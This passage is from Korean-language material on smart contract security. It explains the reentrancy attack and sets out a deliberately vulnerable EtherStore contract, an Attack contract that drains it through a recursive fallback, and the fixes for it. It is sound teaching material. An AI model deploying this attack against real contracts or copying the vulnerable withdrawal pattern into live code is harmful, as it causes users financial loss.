- 코드 품질

    스마트 컨트랙트 코드는 실수를 용납하지 않는다. 모든 버그는 금전적 손실을 발생시킬 수 있다. 스마트 컨트랙트 프로그래밍은 범용 프로그래밍과 같은 방식으로 다루어서는 안 된다. 솔리디티에 댑을 쓰는 것은 자바스크립트로 웹 위젯을 만드는 것과 다르며, 오히려 항공 우주 공학을 비롯해 실수를 용납하지 않는 분야에서와 마찬가지로 엄격한 엔지니어링 및 소프트웨어 개발 방법론을 적용해야 한다. 일단 코드가 '배포'되고 나면 문제를 해결할 수 있는 방법이 거의 없다.

- 가독성/감사 용이성

    코드는 명확하고 이해하기 쉬어야 한다. 읽기 쉬울수록 감사하기도 쉽다. 모든 사람이 바이트코드를 읽을 수 있고 누구나 리버스 엔지니어링 할 수 있을 정도로 스마트 컨트랙트는 공개되어 있다. 따라서 협업과 오픈 소스 방법론을 사용하여 공개적으로 개발을 하는 것이 유익하다. 왜냐하면 개발자 커뮤니터의 집단적 지혜와 오픈 소스 개발의 가장 높은 공통 분모로부터의 혜택을 이용할 수 있기 떄문이다. 이더리움 커뮤니티의 스타일과 명명 규칙에 따라 잘 문서화되고 읽기 쉬운 코드를 작성해야 한다.

- 테스트 범위

    할 수 있는 모든 것을 테스트하라. 스마트 컨트랙트는 공개된 실행 환경에서 실행되며, 누구나 원하는 대로 입력할 수 있다. 함수 인수 같은 입력 값의 형식이 올바르다거나, 적절하게 경계가 지정되어 있거나, 또는 호의적인 목적을 갖고 있다고 가정해서는 안된다. 모든 인수를 테스트하여 코드 실행을 계속하기 전에 모든 인수가 예상 범위 내에 있는지와 올바르게 형식이 지정되었는지를 확인한다.

## 보안 위험 및 안티패턴

스마트 컨트랙트 프로그래머라면 컨트랙트를 위험에 노출시키는 프로그래밍 패턴을 감지하고 피할 수 있도록 가장 공통적인 보안 위험에 익숙해야 한다. 이후의 절들에서는 다양한 보안 위험, 취약성이 발생할 수 있는 사례와 해결 방법 또는 예방 솔루션에 대해 살펴본다.

### 재진입성

이더리움 스마트 컨트랙트의 특징 중 하나는 다른 외부 컨트랙트의 코드를 호출하고 활용할 수 있는 능력이다. 컨트랙트는 또한 일반적으로 이더를 처리하기 때문에 종종 다양한 외부 사용자 주소로 이더를 전송한다. 이런 작업을 수행하려면 컨트랙트는 외부 호출을 요청해야 한다. 이런 외부 호출은 공격자가 악용할 수 있다. 공격자는 컨트랙트에 콜백을 포함하여 대체 코드를 실행하도록 강제할 수 있다. 이런 종류의 공격은 악명 높은 DAO 해킹에 사용되었다.

재진입 공격에 대한 더 자세한 내용은 거스 기마레아스의 블로그 게시물과 이더리움 스마트 컨트랙트 모범 사례를 참고하라.

### 취약점

이런 유형의 공격은 컨트랙트가 알 수 없는 주소로 이더를 전송할 때 발생할 수 있다. 공격자는 폴백 함수에 악성 코드를 갖고 있는 컨트랙트를 외부 주소에 조심스럽게 만들어놓을 수 있다. 따라서 어떤 컨트랙트에서 이 주소로 이더를 보내면 악의적인 코드가 호출된다. 일반적으로 악성 코드는 취약한 컨트랙트에서 개발자가 예상하지 않았던 작업을 실행한다. '재진입'이라는 용어는 외부의 악의적인 컨트랙트가 취약한 컨트랙트의 함수를 호출하고 코드 실행 경로가 그 안으로 '재진입한다'는 사실에서 비롯된 것이다.

이것을 분명히 하기 위해 예제 9-1에서 취약점을 가진 간단한 컨트랙트를 살펴보자. 이 컨트랙트는 입금자가 일주일에 1이더만 회수할 수 있게 하는 이더리움 보관소 기능을 한다.

``` solidity
contract EtherStore {
    uint256 public withdrawLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);
        // 출금 금액 제한
        require(_weiToWithdraw <= withdrawalLimit);
        // 출금 시간 제한
        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
        require(msg.sender.call.value(_weiToWithdraw)());
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
    }
}
```

이 컨트랙트는 depositFunds와 withdrawFunds라는 2개의 공개 함수를 갖고 있다. depositFunds 함수는 단순히 발신자의 잔액을 증가시킨다. withdrawFunds 함수를 사용하면 발신자가 출금할 금액을 지정할 수 있다. 특히 이 함수는 출금 요청 금액이 1이더 미만이고 지난주에 출금이 발생하지 않은 경우에만 성공하도록 되어 있다.

취약점은 컨트랙트에서 사용자에게 요청한 양의 이더를 보내는 17행에 있다. 예제 9-2에서 컨트랙트를 생성하는 공격자를 생각해보자.

아래 예제는 공격자의 코드

``` solidity
import "EtherStore.sol"

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    function attackEtherStore() public payable {
        // 이더 근삿값 공격
        require(msg.value >= 1 ether);
        // 이더를 depositFunds 함수로 전달하기
        etherStore.depositFunds.value(1 ether)();
        // 마법 시작
        etherStore.withdrawFunds(1 ether);
    }

    function collectEther() public {
        msg.sender.transfer(this.balance);
    }

    // 폴백 함수 - 마법이 일어나는 곳
    function () payable {
        if (etherStore.balance > 1 ether) {
            etherStore.withdrawFunds(1 ether);
        }
    }
}
```

### 예방 기법

스마트 컨트랙트에서 잠재적인 재진입 취약점을 해결하는 데 도움이 되는 일반적인 기술이 여러 가지 있다. 첫 번째는 (가능한 한) 이더를 외부의 컨트랙트에 보낼 때 내장된 transfer 함수를 사용하는 것이다. transfer 함수는 외부 호출에 대해 2300개의 가스만을 보내는데, 이 정도의 가스양으로 목적지 주소/ 컨트랙트가 다른 컨트랙트를 호출하기에는 충분하지 않다.

두 번째 방법은 이더가 컨트랙트에서 전송되기 전에 상태 변수를 변경하는 모든 로직이 발생하도록 하는 것이다. 이 EtherStore 예에서 EtherStore.sol의 18행과 19행은 17행 앞에 넣어야 한다. 알 수 없는 주소로 보내는 외부 호출을 수행하는 코드는 지역 함수나 코드 실행 부분에 있어서 가장 마지막 작업이 되도록 하는 것이 바람직하다. 이를 체크 효과 상호작용 패턴이라고 한다.

